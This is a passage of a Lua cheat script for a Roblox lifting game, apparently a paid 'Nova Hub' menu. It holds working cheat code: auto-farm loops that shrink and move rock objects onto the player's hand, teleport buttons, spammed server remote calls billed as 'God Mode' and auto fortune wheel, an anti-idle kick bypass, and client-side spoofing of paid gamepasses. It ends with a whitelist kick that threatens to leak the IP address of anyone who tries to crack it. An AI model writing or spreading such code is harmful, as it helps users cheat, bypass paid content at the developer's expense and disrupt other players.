                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local infernoRockToggle = Rock:AddSwitch("Auto Inferno Rock", function(bool)
            _G.InfernoRock = bool
            if bool then
                autoInfernoRock()
            end
        end)
        infernoRockToggle:Set(false)

        local function autoMysticRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Mystic Rock") and game.Workspace.machinesFolder["Mystic Rock"]:FindFirstChild("Rock")

            _G.MysticRock = true

            while _G.MysticRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local mysticRockToggle = Rock:AddSwitch("Auto Mystic Rock", function(bool)
            _G.MysticRock = bool
            if bool then
                autoMysticRock()
            end
        end)
        mysticRockToggle:Set(false)

        local function autoFrozenRock()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local leftHand = character:WaitForChild("LeftHand")
            local rock = game.Workspace.machinesFolder:FindFirstChild("Frozen Rock") and game.Workspace.machinesFolder["Frozen Rock"]:FindFirstChild("Rock")

            _G.FrozenRock = true

            while _G.FrozenRock do
                if rock then
                    rock.Size = Vector3.new(2, 1, 1)
                    rock.Transparency = 1
                    if rock:FindFirstChild("rockGui") then
                        for _, v in pairs(rock.rockGui:GetChildren()) do
                            v.Visible = false
                        end
                    end
                    rock.CanCollide = false
                    for _, particle in ipairs({"rockEmitter", "hoopParticle", "lavaParticle"}) do
                        if rock:FindFirstChild(particle) then
                            rock[particle]:Destroy()
                        end
                    end
                    rock.CFrame = leftHand.CFrame
                end
                wait()
            end
        end

        local frozenRockToggle = Rock:AddSwitch("Auto Frozen Rock", function(bool)
            _G.FrozenRock = bool
            if bool then
                autoFrozenRock()
            end
        end)
        frozenRockToggle:Set(false)

        local Misc = window:AddTab("Misc")
        local Teleport = Misc:AddFolder("Teleport")

        Teleport:AddButton("Tiny Island", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.8626194, 6.0588026, 2087.88672)
        end)

        Teleport:AddButton("Starter Island", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226.252472, 8.1526947, 219.366516)
        end)

        Teleport:AddButton("Legend Beach", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.798309, 44.5082932, -501.618591)
        end)

        Teleport:AddButton("Frost Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2933.47998, 29.6399612, -579.946045)
        end)

        Teleport:AddButton("Mythical Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2659.50635, 21.6095238, 934.690613)
        end)

        Teleport:AddButton("Eternal Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7176.19141, 45.394104, -1106.31421)
        end)

        Teleport:AddButton("Legend Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4446.91699, 1004.46698, -3983.76074)
        end)

        Teleport:AddButton("Jungle Gym", function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8137, 28, 2820)
        end)

        local folder = Misc:AddFolder("Brawl")
        local godModeToggle = false
        folder:AddSwitch("God Mode (Brawl)", function(State)
            godModeToggle = State
            if State then
                task.spawn(function()
                    while godModeToggle do
                        game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                        task.wait(0)
                    end
                end)
            end
        end)

        local autoJoinToggle = false
        folder:AddSwitch("Auto Join Brawl", function(State)
            autoJoinToggle = State
            if State then
                task.spawn(function()
                    while autoJoinToggle do
                        game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                        task.wait(2)
                    end
                end)
            end
        end)

        local folder2 = Misc:AddFolder("Misc1")
        folder2:AddButton("Destroy Ad Teleport", function()
            local part = workspace:FindFirstChild("RobloxForwardPortals")
            if part then
                part:Destroy()
            end
        end)

        folder2:AddButton("Anti Kick", function()
            wait(0.5)
            local ba = Instance.new("ScreenGui")
            local ca = Instance.new("TextLabel")
            local da = Instance.new("Frame")
            local _b = Instance.new("TextLabel")
            local ab = Instance.new("TextLabel")

            ba.Parent = game.CoreGui
            ba.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            ca.Parent = ba
            ca.Active = true
            ca.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            ca.Draggable = true
            ca.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
            ca.Size = UDim2.new(0, 370, 0, 52)
            ca.Font = Enum.Font.SourceSansSemibold
            ca.Text = "Anti Afk"
            ca.TextColor3 = Color3.new(0, 1, 1)
            ca.TextSize = 22

            da.Parent = ca
            da.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
            da.Position = UDim2.new(0, 0, 1.0192306, 0)
            da.Size = UDim2.new(0, 370, 0, 107)

            _b.Parent = da
            _b.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            _b.Position = UDim2.new(0, 0, 0.800455689, 0)
            _b.Size = UDim2.new(0, 370, 0, 21)
            _b.Font = Enum.Font.Arial
            _b.Text = "Made by luca#5432"
            _b.TextColor3 = Color3.new(0, 1, 1)
            _b.TextSize = 20

            ab.Parent = da
            ab.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
            ab.Position = UDim2.new(0, 0, 0.158377, 0)
            ab.Size = UDim2.new(0, 370, 0, 44)
            ab.Font = Enum.Font.ArialBold
            ab.Text = "Status: Active"
            ab.TextColor3 = Color3.new(0, 1, 1)
            ab.TextSize = 20

            local bb = game:GetService("VirtualUser")
            game.Players.LocalPlayer.Idled:Connect(function()
                bb:CaptureController()
                bb:ClickButton2(Vector2.new())
                ab.Text = "Roblox tried kicking you, but I won't let them!"
                wait(2)
                ab.Text = "Status: Active"
            end)
        end)

        folder2:AddSwitch("Unable Trade", function(State)
            if State then
                game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("disableTrading")
            else
                game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("enableTrading")
            end
        end)

        folder2:AddSwitch("Hide Pets", function(State)
            if State then
                game:GetService("ReplicatedStorage").rEvents.showPetsEvent:FireServer("hidePets")
            else
                game:GetService("ReplicatedStorage").rEvents.showPetsEvent:FireServer("showPets")
            end
        end)

        local switch = Misc:AddSwitch("Lock Position", function(Value)
            if Value then
                local currentPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                getgenv().posLock = game:GetService("RunService").Heartbeat:Connect(function()
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = currentPos
                    end
                end)
            else
                if getgenv().posLock then
                    getgenv().posLock:Disconnect()
                    getgenv().posLock = nil
                end
            end
        end)

        local switchGamepads = Misc:AddSwitch("Free Auto Lift Gamepass", function(Value)
            local gamepassFolder = game:GetService("ReplicatedStorage"):FindFirstChild("gamepassIds")
            local player = game:GetService("Players").LocalPlayer

            if not gamepassFolder or not player then return end

            if Value then
                for _, gamepass in pairs(gamepassFolder:GetChildren()) do
                    if not player.ownedGamepasses:FindFirstChild(gamepass.Name) then
                        local value = Instance.new("IntValue")
                        value.Name = gamepass.Name
                        value.Value = gamepass.Value
                        value.Parent = player.ownedGamepasses
                    end
                end
            else
                for _, gamepass in pairs(player.ownedGamepasses:GetChildren()) do
                    gamepass:Destroy()
                end
            end
        end)

Misc:AddSwitch("Auto Fortune Wheel", function(Value)
    _G.autoFortuneWheelActive = Value
    if Value then
        local function openFortuneWheel()
            while _G.autoFortuneWheelActive do
                local args = {
                    [1] = "openFortuneWheel",
                    [2] = game:GetService("ReplicatedStorage"):WaitForChild("fortuneWheelChances"):WaitForChild("Fortune Wheel")
                }
                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("openFortuneWheelRemote"):InvokeServer(unpack(args))
                wait(0)
            end
        end
        coroutine.wrap(openFortuneWheel)()
    else
        _G.autoFortuneWheelActive = false
    end
end)

        local Credit = window:AddTab("Credit")
        Credit:AddLabel("Script Made By Encrypted")
        Credit:AddLabel("Nova Hub Paid Version , 1.7K Robux")
        Credit:AddLabel("|")
        Credit:AddLabel("Close Friends:")
        Credit:AddLabel("D3Ath, Slayerson, CwmoKai, X3NO, MLR Taken, Havoc, Lucky, Aabis, Blackyy")
    

   end
end
else
        player:Kick("You Are Not Whitelisted If You Attempted To Crack This Script Your IP Will Be Leaked")
end
